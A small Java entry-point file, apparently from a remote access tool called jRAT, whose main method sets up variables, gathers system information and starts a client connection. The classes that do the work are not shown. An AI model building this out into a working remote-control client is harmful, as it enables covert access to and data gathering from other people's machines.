package net.jrat;

import net.jrat.core.Client;
import net.jrat.core.connection.SystemInformations;
import net.jrat.utils.Variables;

public class Bootstrap
{
	public static void main(String[] arguments)
	{
		(new Variables()).create();
		(new SystemInformations()).create();
		
		(new Client()).start();
	}
}
